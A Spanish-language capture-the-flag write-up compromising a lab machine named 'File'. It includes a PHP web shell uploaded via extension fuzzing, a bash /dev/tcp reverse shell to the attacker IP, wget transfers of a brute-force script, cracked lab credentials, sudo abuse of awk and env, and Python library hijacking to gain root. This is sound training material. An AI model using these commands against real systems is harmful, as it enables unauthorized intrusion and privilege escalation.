# File - Writeup

## Resumen
File nos presenta una máquina en la cual tendremos que usar burpsuite para interceptar una petición y ajustarla de acuerdo a los filtros para luego realizar una reverse shell, dentro del sistema iremos saltando de usuarios hasta aplicar un **Python Library Hijacking** y escalar a usuarios root.

## Paso N1: Reconocimiento
Empezaremos escaneando los puertos TCP abiertos en la máquina con sus respectivos servicios y versiones
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
```
![](images/img1.png)

Podemos ver que están abiertos los puertos 21 y 80 correspondientes a los servicios ftp y http.

En esta máquina especificamente, no profundizaré en el servidor ftp dado a que no tiene información relevante (recomendable entrar para experimentar y sacar criterio propio.)

## Paso N2: Busqueda de subdirectorios
Ya que no hay información relevante en el servidor ftp, empezaremos la busqueda de subdirectorios con ```gobuster```
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html
```
<img width="665" height="538" alt="image" src="https://github.com/user-attachments/assets/33f79738-6930-404a-8232-a3b79d8227e1" />

Vemos que tenemos los subdirectorios ```/uploads/``` y ```/file_upload.php``` disponibles.

Al entrar a ```/uploads/``` podemos ver que es un **Directory Listing**
<img width="520" height="196" alt="image" src="https://github.com/user-attachments/assets/251d4842-d4ee-4a09-9244-5e9a007250c0" />

No hay mucho que hacer aqui.

Al entrar a ```/file_upload.php```
<img width="673" height="128" alt="image" src="https://github.com/user-attachments/assets/fa98bbc6-3830-4a65-af8b-2327c4512330" />

Podemos ver que que nos deja subir un archivo, por lo que pasaremos a explotar esta función.

## Paso N3: Entendiendo el problema
La idea es hacer que la página ejecute código php para desde ahí poder trabajar, por lo que creamos el script malicioso:
```
echo '<?php        
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Escribe tu comando aquí" style="width:400px">
    <input type="submit" value="Ejecutar">
</form>' > script.php
```
Si lo intentamos subir, nos dirá ```No se ha cargado ningun archivo o hubo un error.```

Es probable que lo que esté fallando sea la extensión, por lo que intentaremos interceptar la petición y hacerle fuerza bruta a las extensiones a ver cual de todas nos permite subirla correctamente.

## Paso N4: Interceptando la petición
Entraremos a burpsuite en modo escucha e interceptaremos la petición que hicimos subiendo ```script.php``` y lo enviaremos al intruder
<img width="1366" height="275" alt="image" src="https://github.com/user-attachments/assets/9fd98ef1-97d8-4da9-b1ea-41f6ac7a5b32" />

Agregaremos los ```§§``` al ```.php```, quedando ```§.php§```. Configuraremos el payload en **Simple list** y buscaremos alguna wordlist de extensiones, en este caso, usaré ```/usr/share/seclists/Discovery/Web-Content/web-extensions.txt``` y desactivaremos el URL-encode (final del todo en el apartado de payloads)
<img width="1366" height="553" alt="image" src="https://github.com/user-attachments/assets/28af56e1-3903-4bd8-b7ec-517bdd87a1a8" />
<img width="393" height="115" alt="image" src="https://github.com/user-attachments/assets/5d879d8c-6093-4a9b-9cad-0fbba995f639" />

Y empezaremos el ataque. Podemos notar que la extension ```.phar``` tiene más tamaño que las demás extensiones, por lo que si entramos y vemos la respuesta, veremos que el archivo se subió correctamente
<img width="579" height="357" alt="image" src="https://github.com/user-attachments/assets/422cede5-36d2-4bb6-8704-394e36eaf749" />

## Paso N5: Generando reverse shell
Una vez subido el archivo, veremos que se verá reflejado en el **Directory Listing** ```/uploads/```
<img width="542" height="215" alt="image" src="https://github.com/user-attachments/assets/173bd6ec-d73f-49e3-aa2e-f92fbfae5123" />

Entraremos al archivo y veremos que tenemos un input para poder colocar comandos. por lo que ahora, escuchando en una terminal con ```nc -lvnp 443``` ejecutaremos la reverse shell de la siguiente manera:
```
bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
```
<img width="641" height="193" alt="image" src="https://github.com/user-attachments/assets/21660bd6-d48b-4a95-a2e5-b4e6862e2512" />

Y finalmente tendremos acceso a la máquina.

**Nota Post-Write up: Sanitizar: ```python3 -c 'import pty; pty.spawn("/bin/bash")'```** 

## Paso N6: Preparando herramientas necesarias
Una vez dentro, en el directorio ```/home/``` veremos que tenemos 4 usuarios, por lo que tendremos que buscar acceder a uno de ellos. Obviaremos las técnicas usuales de búsqueda de credenciales ya que ninguna se aplica en esta máquina.
<img width="485" height="150" alt="image" src="https://github.com/user-attachments/assets/5a23eb8f-6567-4cd0-93db-daf154f8bf49" />

Para poder acceder a uno de los usuarios, tendremos que hacer fuerza bruta mediante algún script/programa externo, ya que no estamos en un servidor ssh o ftp.

Utilizaremos una herramienta creada por mi llamada [KaiteForce](https://github.com/kaiteMuak/KaiteForce) la cual nos permitirá hacer fuerza bruta en local, la descargaremos de la siguiente forma:
```
wget --no-check-certificate -q 'https://raw.githubusercontent.com/kaiteMuak/KaiteForce/refs/heads/main/kforce.sh'
```
Luego, abriremos un servidor python en la ruta donde tenemos [KaiteForce](https://github.com/kaiteMuak/KaiteForce) descargada (importante tener ```rockyou.txt``` o cualquier otra wordlist en la misma ruta)
```
python3 -m http.server 8000
```
y en la máquina victima descargaremos los archivos necesarios en ```/tmp/``` (ya que es una carpeta donde tenemos permisos) de la siguiente manera:
```
wget http://172.17.0.1:8000/kforce.sh
wget http://172.17.0.1:8000/rockyou.txt
```
<img width="669" height="533" alt="image" src="https://github.com/user-attachments/assets/54b8dfbc-a0c3-40a8-a6eb-4ecdcbabf03b" />

## Paso N7: Fuerza bruta con Kforce
Una vez ya tengamos [KaiteForce](https://github.com/kaiteMuak/KaiteForce) y ```rockyou.txt``` en la máquina victima, podemos hacer fuerza bruta dándole permisos
```
chmod +x kforce.sh
```
y ejecutando 
```
./kforce.sh
```
<img width="508" height="380" alt="image" src="https://github.com/user-attachments/assets/7f224c8d-a3fc-47cf-8796-104debb07724" />

Vemos que las credenciales del usuario fernando son: ```fernando:chocolate``` por lo que ahora podemos acceder.

## Paso N8: Descubriendo credenciales
Una vez ya dentro del usuario ```fernando``` podemos ver que en su ```/home/fernando``` hay una imágen, por lo que la pasamos a la máquina atacante abriendo un servidor 
```
python3 -m http.server 8000
```
y pasando a nuestra máquina con:
```
wget http://172.17.0.2:8000/dragon-medieval.jpeg
```
<img width="664" height="257" alt="image" src="https://github.com/user-attachments/assets/d4ae14d5-6ce6-4fec-8e63-648e6b73561f" />

y una vez la tengamos en nuestra máquina, usaremos ```stegcracker```
<img width="665" height="305" alt="image" src="https://github.com/user-attachments/assets/6b9a639b-4e88-4589-87b5-99d567f45013" />

Esto nos dejará ```dragon-medieval.jpeg.out``` dentro tiene un hash, cual contenido es:
<img width="1253" height="95" alt="image" src="https://github.com/user-attachments/assets/a8e44146-8d1f-4f84-a5ca-24de77a50347" />
```
password123
```

## Paso N9: Accediendo a usuarios
Una vez ya tenemos la contraseña de uno de los usuarios, probaremos la contraseña en cada uno
<img width="331" height="205" alt="image" src="https://github.com/user-attachments/assets/d5fa21df-78d1-4017-8486-fea4ffc7a9a3" />

Y vemos que podemos acceder a mario.

Dentro de usuario mario, ejecutaremos ```sudo -l``` y veremos
<img width="669" height="156" alt="image" src="https://github.com/user-attachments/assets/5320a462-8680-4877-84f6-f01fa709d6d2" />
```
(julen) NOPASSWD: /usr/bin/awk
```
De acuerdo con GTFObins, ejecutamos 
```
sudo -u julen awk 'BEGIN {system("/bin/sh")}'
```

y entramos al usuario julen, el cual nuevamente hacemos ```sudo -l```
<img width="672" height="264" alt="image" src="https://github.com/user-attachments/assets/5ed793ae-0c5e-4385-a456-f0d8b4fcdd24" />
```
(iker) NOPASSWD: /usr/bin/env
```
Nuevamente, de acuerdo a GTFObins, ejecutamos 
```
sudo -u iker env /bin/sh -p
```
y accedemos al usuario iker.

## Paso N10: escalando privilegios
Una vez ya como usuario iker, podemos ejecutar ```sudo -l```
<img width="670" height="174" alt="image" src="https://github.com/user-attachments/assets/3a3302e3-b759-46b1-946b-ff85998035a4" />
```
(ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py
```
podemos ver que en el directorio ```/home/iker/``` hay un script de python el cual tiene la declaración
```
import requests;
```
<img width="545" height="132" alt="image" src="https://github.com/user-attachments/assets/8c7c77f4-3753-455c-a05e-fa33bc69651b" />

Por lo que podemos hacer **Python library hijacking**. 
```
echo 'import os; os.system("/bin/bash")' > /home/iker/requests.py
```
Y ahora si ejecutamos
```
sudo /usr/bin/python3 /home/iker/geo_ip.py
```
y finalmente seremos usuarios root.
<img width="536" height="151" alt="image" src="https://github.com/user-attachments/assets/2c69eccc-6c06-4745-96da-a1855ac34b1b" />

